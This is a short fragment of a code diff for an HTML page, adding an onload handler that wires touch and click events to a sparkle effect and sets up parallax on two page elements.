+        window.onload=()=>{ window.addEventListener('touchstart',spawnSparkle,{passive:true}); window.addEventListener('click',spawnSparkle); setupParallax('world-girl'); setupParallax('world-boy'); };
     </script>
 </body>
 </html>
